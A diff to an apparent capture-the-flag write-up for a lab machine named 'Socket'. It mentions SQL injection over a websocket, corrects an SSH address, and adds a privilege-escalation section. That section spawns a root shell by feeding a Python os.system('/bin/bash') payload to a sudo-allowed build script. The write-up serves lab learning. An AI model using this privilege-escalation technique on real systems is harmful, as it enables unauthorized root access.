@@ -126,6 +126,8 @@ Testing ws://10.10.11.206:5789
 - Code vulnerable to SQL injection in the `qreader.py` source code file.
 ![image](https://user-images.githubusercontent.com/83878909/230321898-e204482f-f555-4174-95a0-99bcbfe452eb.png)
 
+---
+
 - Retrieving the Usernames
 ```CSS
 from websocket import create_connection
@@ -165,6 +167,25 @@ ws.close()
 
 ## SSH Login
 ```CSS
-▶ ssh tkeller@10.10.10.206
+▶ ssh tkeller@10.10.11.206
 ```
 ![image](https://user-images.githubusercontent.com/83878909/230324605-3f62c848-a217-4a0a-98d0-3a7bcd6198dc.png)
+
+---
+
+## Privilege Escalation
+![image](https://user-images.githubusercontent.com/83878909/230350782-60deba75-561c-4e84-a0f2-002dca5ac2fa.png)
+- Executable with ROOT privileges: `/usr/local/sbin/build-installer.sh`
+- Payload
+```CSS
+import os
+
+os.system("/bin/bash")
+```
+- The script requires two arguments `build` and a file containing the above payload with a `.spec` extension.
+```CSS
+tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build payload.spec
+```
+![image](https://user-images.githubusercontent.com/83878909/230352375-207b18d2-45c9-43b5-950b-f2df02e23463.png)
+
+---
